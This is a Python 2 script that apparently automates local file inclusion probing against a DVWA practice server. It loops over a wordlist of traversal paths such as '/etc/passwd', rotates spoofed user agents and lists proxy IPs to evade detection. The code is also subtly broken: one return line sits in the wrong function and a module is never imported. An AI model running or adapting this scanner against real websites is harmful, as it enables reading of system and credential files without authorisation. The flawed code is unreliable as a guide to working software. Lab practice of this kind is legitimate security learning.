import urllib
import requests
import time
import ssl
import random
from urllib2 import urlopen


def openUrl(url, ip, agent):
    headers = {'User-Agent': agent, 'Cookie': "PHPSESSID=4rp1ntef0utfrk6r268uluhve2; security=low"}
    proxies = {'http': ip}
    response = requests.get(url, headers=headers, verify=True)  # can also add proxies=proxies as parameter
    ssl._create_default_https_context = ssl._create_unverified_context
    if response.status_code == 200:
        print("Successfully access to " + url)


def randomIP():
    ip = random.choice(['120.78.78.141', '122.72.18.35', '120.92.119.229'])
    return ip


def randomUserAgent():
    UserAgent = random.choice(['Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11 @@@',
                               'Opera/9.25 (Windows NT 5.1; U; en) @@@',
                               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727) @@@',
                               'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu) @@@',
                               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.12) Gecko/20070731 Ubuntu/dapper-security Firefox/1.5.0.12 @@@',
                               'Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/1.2.9 @@@',
                               "Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.7 (KHTML, like Gecko) Ubuntu/11.04 Chromium/16.0.912.77 Chrome/16.0.912.77 Safari/535.7 @@@",
                               "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0 @@@ ",

                               'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 @@@',
                               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36 @@@',
                               'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36 @@@'])
    return UserAgent


def randomURL(A):
    URL = random.choice(A)
    return URL


def correctUrl(url):  # ex: 'http://127.0.0.1/lfi.php?file=/etc/passwd' --> 'http://127.0.0.1/lfi.php?file='
    if(url[len(url) - 1] == '='):
        return url
    eq = SubstrFind(url, "=")
    if(len(eq) == 0):
        print "\n[ERROR] Invalid URL syntax!\n"
        sys.exit()
    last = eq[len(eq) - 1]


def checkHttp(url):
    if("http://" not in url and "https://" not in url):
        return "http://%s" % url
    return url
    return url[:(last + 1)]


def SubstrFind(resp, toFind):
    if(len(toFind) > len(resp)):
        return []

    found = False
    indexes = []

    for x in range(0, (len(resp) - len(toFind)) + 1):
        if(ord(resp[x]) == ord(toFind[0])):
            found = True
            for i in range(0, len(toFind)):
                if(ord(resp[x + i]) != ord(toFind[i])):
                    found = False
                    break
        if(found):
            indexes.append(x)
            found = False
            x += len(toFind)

    return indexes


def generateA():
    url = 'http://192.168.0.121/vulnerabilities/fi/?page='
    #url = correctUrl(url)
    #url = checkHttp(url)
    A = []
    for line in file("pathtotest_huge.txt"):
        c = line.strip('\n')
        website = url + c
        A.append(website)
    return A


while True:
    A = generateA()
    ip = randomIP()
    agent = randomUserAgent()
    url = randomURL(A)
    openUrl(url, ip, agent)
    time.sleep(random.randint(1, 10))
